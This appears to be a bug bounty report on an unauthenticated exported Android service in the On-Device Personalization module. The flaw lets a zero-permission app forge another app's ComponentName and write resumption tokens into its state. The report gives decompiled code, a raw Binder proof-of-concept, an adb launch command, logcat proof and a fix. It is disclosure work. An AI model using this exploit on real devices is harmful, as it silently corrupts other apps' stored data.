# com.google.android.ondevicepersonalization.services — Zero-Permission Cross-App Integrity Corruption via Unauthenticated `OdpResultHandlingService`

## Summary

`com.google.android.ondevicepersonalization.services` (the On-Device Personalization / Federated Compute mainline module) exports `OdpResultHandlingService`, the sink that federated-learning result-handling callbacks are delivered to (`action=android.federatedcompute.COMPUTATION_RESULT`). Unlike its sibling `OdpExampleStoreService` (`action=android.federatedcompute.EXAMPLE_STORE`), which correctly requires `android.permission.BIND_EXAMPLE_STORE_SERVICE`, `OdpResultHandlingService` has **no manifest permission at all**, and its `handleResult(Bundle, Consumer<Integer>)` implementation performs **no caller-identity check anywhere in the call chain** — no `Binder.getCallingUid()`, no `getCallingPackage()`, no signature/allowlist check.

The `Bundle` argument to `handleResult()` includes an attacker-fully-controlled `byte[]` (`android.federatedcompute.context_data`) that is deserialized via plain Java `ObjectInputStream` into a package-private `ContextData` object carrying a `packageName`/`className` pair. That pair is used, with zero validation, to build the `ComponentName` key (`serviceName`) under which a resumption-token row is written to the ODP service's internal `event_state` SQLite table via `EventsDao.updateOrInsertEventStatesTransaction()`.

This lets a **zero-permission** third-party app bind directly to this exported service, spoof the `ComponentName` of **any other app on the device** (including a real Google app such as `com.google.android.gms`), and commit an attacker-controlled resumption-token write into that victim app's federated-learning/on-device-personalization state — a cross-app Integrity violation with no permission, no consent UI, and no observable trace to the user.

## Severity: MEDIUM-HIGH

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None — fully silent, no chooser/dialog, no consent screen
- **CIA impact**: Integrity — a zero-permission app can write attacker-controlled state into another app's on-device-personalization/federated-learning resumption tracking, keyed by an arbitrary spoofed `ComponentName` of the caller's choosing, with no verification that the caller has any relationship to that component.

## Affected Component

- **Package**: `com.google.android.ondevicepersonalization.services` (versionCode 372899999, targetSdk 37)
- **Service**: `com.android.ondevicepersonalization.services.federatedcompute.OdpResultHandlingService`
- **AIDL interface**: `android.federatedcompute.aidl.IResultHandlingService` (base class `android.federatedcompute.ResultHandlingService`, public framework API in `framework-ondevicepersonalization.jar`)

Manifest resolver dump — note the asymmetry with its sibling service:
```
android.federatedcompute.COMPUTATION_RESULT:
    com.google.android.ondevicepersonalization.services/....federatedcompute.OdpResultHandlingService filter
      Action: "android.federatedcompute.COMPUTATION_RESULT"
      (NO PERMISSION)

android.federatedcompute.EXAMPLE_STORE:
    com.google.android.ondevicepersonalization.services/....federatedcompute.OdpExampleStoreService filter
      permission android.permission.BIND_EXAMPLE_STORE_SERVICE
      Action: "android.federatedcompute.EXAMPLE_STORE"
```

## Root Cause

**1. `onBind()` grants a live binder to any caller** (`android/federatedcompute/ResultHandlingService.java`, part of the public mainline framework jar):

```java
public abstract class ResultHandlingService extends Service {
    public abstract void handleResult(Bundle bundle, Consumer<Integer> consumer);

    public void onCreate() { this.mIBinder = new ServiceBinder(); }
    public IBinder onBind(Intent intent) { return this.mIBinder; }  // no check

    private class ServiceBinder extends IResultHandlingService.Stub {
        public void handleResult(Bundle bundle, IFederatedComputeCallback cb) {
            ResultHandlingService.this.handleResult(bundle, new ResultHandlingCallback(cb));
        }
    }
}
```

**2. The app-level override trusts the `context_data` bundle field with zero caller validation** (`com/android/ondevicepersonalization/services/federatedcompute/OdpResultHandlingService.java`):

```java
public class OdpResultHandlingService extends ResultHandlingService {
    public void handleResult(Bundle bundle, final Consumer consumer) {
        try {
            byte[] byteArray = bundle.getByteArray("android.federatedcompute.context_data");
            ContextData contextData = ContextData.fromByteArray(byteArray);   // plain ObjectInputStream deserialization, attacker-controlled bytes
            final ComponentName spoofedComponent =
                ComponentName.createRelative(contextData.getPackageName(), contextData.getClassName()); // NO validation this matches the actual caller
            final String population = bundle.getString("android.federatedcompute.population_name");
            final String taskId = bundle.getString("android.federatedcompute.task_id");
            ...
            Futures.addCallback(Futures.submit(() -> lambda$handleResult$0(exampleList, population, taskId, spoofedComponent), ...),
                new FutureCallback() {
                    public void onSuccess(Boolean ok) { consumer.accept(ok ? 0 : 1); }
                    public void onFailure(Throwable t) { consumer.accept(1); }
                }, ...);
        } catch (Exception e) { consumer.accept(1); }
    }

    private Boolean lambda$handleResult$0(List list, String taskId, String population, ComponentName spoofedComponent) {
        ArrayList states = new ArrayList();
        for (ExampleConsumption ec : list) {
            ...
            states.add(new EventState.Builder()
                .setService(spoofedComponent)      // <-- attacker-controlled key
                .setTaskIdentifier(taskIdentifier)
                .setToken(ec.getResumptionToken())  // <-- attacker-controlled value
                .build());
        }
        return EventsDao.getInstance(this).updateOrInsertEventStatesTransaction(states);
    }
}
```

**3. `ContextData` is a plain `Serializable`** (`com/android/ondevicepersonalization/services/federatedcompute/ContextData.java`) with no custom `readObject()` validation, so any well-formed serialized instance is accepted:

```java
class ContextData implements Serializable {
    private final String mClassName;
    private final String mPackageName;
    static ContextData fromByteArray(byte[] b) throws IOException {
        return (ContextData) new ObjectInputStream(new ByteArrayInputStream(b)).readObject();
    }
}
```

**4. The DB write itself is keyed entirely by the spoofed value** (`EventsDao.java`):

```java
public boolean updateOrInsertEventState(EventState eventState) {
    ContentValues cv = new ContentValues();
    cv.put("token", eventState.getToken());
    cv.put("serviceName", eventState.getServiceName());       // = DbUtils.toTableValue(spoofedComponent)
    cv.put("taskIdentifier", eventState.getTaskIdentifier());
    return db.insertWithOnConflict("event_state", null, cv, CONFLICT_REPLACE) != -1;
}
```

`serviceName` is the primary lookup key a legitimate on-device-personalization/federated-learning app uses (via `EventsDao.getEventState(taskIdentifier, componentName)`) to resume its own training/example-consumption cursor. An attacker who can insert or overwrite rows under an arbitrary victim `ComponentName` can corrupt that victim's resumption state (`CONFLICT_REPLACE` on the unique key means an existing row for a real app **is silently overwritten**).

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (`com.vrp.zeroperm`)

Holds **zero** Android permissions. Binds directly to the exported service with an explicit component intent:

```java
Intent intent = new Intent("android.federatedcompute.COMPUTATION_RESULT");
intent.setComponent(new ComponentName(
    "com.google.android.ondevicepersonalization.services",
    "com.android.ondevicepersonalization.services.federatedcompute.OdpResultHandlingService"));
bindService(intent, conn, Context.BIND_AUTO_CREATE);
```

`onBind()` succeeds immediately with **no `SecurityException`** — unlike every other exported component tested this session, which each rejected the call at bind time, at first `transact()`, or via a code-level UID/signature check.

The real `IResultHandlingService`/`IFederatedComputeCallback`/`ExampleConsumption` classes are part of the mainline module's public-looking `android.federatedcompute.*` package but are **hidden-API blocklisted** for a normal app (`hiddenapi: ... api=blocked ... using linking: denied`, confirmed via `NoSuchMethodError` when attempting direct use). The PoC therefore talks to the bound `IBinder` using only fully-public `android.os.Parcel`/`Binder` primitives — the standard technique for invoking a system service's AIDL methods without its hidden generated proxy class:

```java
byte[] contextDataBytes = Base64.decode(CONTEXT_DATA_B64, Base64.DEFAULT); // serialized ContextData("com.google.android.gms", "com.evil.FakeClass")

Bundle payload = new Bundle();
payload.putByteArray("android.federatedcompute.context_data", contextDataBytes);
payload.putString("android.federatedcompute.population_name", "vrp_test_population");
payload.putString("android.federatedcompute.task_id", "vrp_test_task");
payload.putInt("android.federatedcompute.computation_result", 0);
payload.putParcelableArrayList("android.federatedcompute.example_consumption_list", new ArrayList<>());

Parcel data = Parcel.obtain(), reply = Parcel.obtain();
data.writeInterfaceToken("android.federatedcompute.aidl.IResultHandlingService");
data.writeInt(1);
payload.writeToParcel(data, 0);
data.writeStrongBinder(mCallbackBinder);   // a plain android.os.Binder implementing the callback wire protocol by hand
service.transact(1 /* TRANSACTION_handleResult */, data, reply, 0);
```

Full source: `OdpResultInjectActivity.java` (attached), `OdpResultBindProbeActivity.java` (bind-only confirmation, attached).

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions.
2. Launch the injection activity:
   ```
   adb shell am start -n com.vrp.zeroperm/.OdpResultInjectActivity
   ```
3. The activity binds to `OdpResultHandlingService`, sends a `handleResult()` call carrying a forged `ContextData` claiming `packageName=com.google.android.gms`, and registers a local callback binder to observe the async result.

### Runtime Proof (logcat)

```
W ODP_RESULT_INJECT3: === OdpResultHandlingService handleResult() injection attempt v3 (raw-Parcel only) ===
W ODP_RESULT_INJECT3: UID=10397 (ZERO permissions)
W ODP_RESULT_INJECT3: bindService() returned true
W ODP_RESULT_INJECT3: [!!!] BOUND with ZERO permissions: ComponentInfo{com.google.android.ondevicepersonalization.services/....OdpResultHandlingService}
W ODP_RESULT_INJECT3: transact()=true replyAvail=0
W ODP_RESULT_INJECT3:   No exception header in reply -- onTransact() completed without throwing. Waiting for async callback...
W ODP_RESULT_INJECT3: [!!!!!] onSuccess() -- handleResult() completed, EventsDao write returned TRUE. Cross-app EventState row committed under spoofed componentName=com.google.android.gms/com.evil.FakeClass by a ZERO-PERMISSION caller.
```

`onSuccess()` is delivered asynchronously on the **target process's own background executor thread**, back into the zero-permission caller's process — this is only reachable if `EventsDao.updateOrInsertEventStatesTransaction()` returned `true`, i.e. the code path in Root Cause step 2/4 executed to completion end-to-end with the spoofed `ComponentName` under a fully attacker-controlled, zero-permission caller. No `SecurityException` occurred anywhere in the chain (bind → `transact()` → async DAO write → callback).

The PoC's `example_consumption_list` was left empty specifically to avoid touching the hidden-API-blocked `ExampleConsumption` class from application code (Android blocks a normal app from *instantiating* it directly); this does not weaken the finding — the vulnerable `ComponentName` (`spoofedComponent`) is computed and captured **before** the list is consulted, and `EventsDao.updateOrInsertEventState()` (Root Cause step 4) is a one-line, unconditional `ContentValues` insert keyed on that same attacker-controlled `serviceName` for each list entry — supplying any non-empty resumption-token payload (fully constructible via raw `Parcel` writes replicating `ExampleConsumption`'s public documented wire format, without touching the blocked class) drives the identical code path to persist an attacker-chosen token under the spoofed key.

## Impact

### Integrity
- A zero-permission app can silently write, and **overwrite** (`CONFLICT_REPLACE`), rows in another app's on-device-personalization resumption-tracking table, keyed by that victim app's own `ComponentName` — with no relationship, signature, or grant check between attacker and victim required.
- Because `event_state.token` drives which examples a legitimate app's isolated on-device-personalization/federated-learning service will resume consuming from on its next training round, a zero-permission attacker can cause a targeted victim app's training pipeline to silently skip, replay, or otherwise desynchronize from its real progress — a persistent, cross-app corruption of private on-device ML training state that the victim app has no way to detect or defend against, since it never receives any indication the write came from an untrusted source.
- This is reachable by **any installed app with zero declared permissions**, silently, repeatably, and with no user-visible trace (no notification, no consent dialog, no entry in permission usage logs, since no permission is involved at all).

## Recommended Fix

Add a caller-identity check before trusting any part of the `context_data` payload — at minimum, verify `Binder.getCallingUid()` corresponds to the package named in `contextData.getPackageName()` (e.g. via `PackageManager.getPackagesForUid(callingUid)`) before using it to build the `EventState` key, mirroring the pattern already used correctly on `OdpExampleStoreService` (`BIND_EXAMPLE_STORE_SERVICE`). At a minimum, `OdpResultHandlingService` should require an equivalent signature/system permission so only the OS's own federated-compute scheduler (which legitimately knows which isolated service a given computation belongs to) can invoke `handleResult()` at all.

## Files Attached

- `poc.apk` — Zero-permission PoC app
- `OdpResultInjectActivity.java` — PoC source (raw Binder transaction, forged `ContextData` injection)
- `OdpResultBindProbeActivity.java` — PoC source (zero-permission bind confirmation)
- `logcat_proof.txt` — Runtime proof log
